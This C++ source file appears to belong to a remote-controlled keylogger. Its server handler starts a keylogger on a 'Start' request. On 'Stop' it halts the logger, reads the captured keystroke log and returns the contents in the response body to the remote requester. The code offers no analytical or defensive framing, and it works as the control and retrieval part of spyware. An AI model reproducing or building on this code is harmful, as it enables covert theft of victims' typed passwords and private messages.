#include "Server.h"

#include "KeyLogger.h"

bool Server::keylog(Request& request, Response &response) {
    static KeyLogger keylog;

    string subaction = request.getParam(kSubAction);
    response.putParam(kStatus, "Ok");
    
    if (subaction == "Start") {
        cout << "Started keylogger\n";
        keylog.startKeylogger(); 
    } else if (subaction == "Stop") {
        cout << "Stopped keylogger\n";
        keylog.stopKeylogger();

        ifstream fin = keylog.getLoggingStream();
        string content; 
        string buf;
        while (getline(fin, buf)) {
            content += buf + "\n"; 
        }
        fin.close();
    
        response.putParam(kBody, content);
    }  

    return true;
}

bool Server::processRequest(Request& request, Response &response) {
    cout << "Processing Request\n" << request << "\n";
    response.setAction(request.getAction());
    response.getParams().clear();
    
    switch (request.getAction()) {
        case ACTION_KEYLOG:
            return keylog(request, response);
        default:
            return false;
    }
}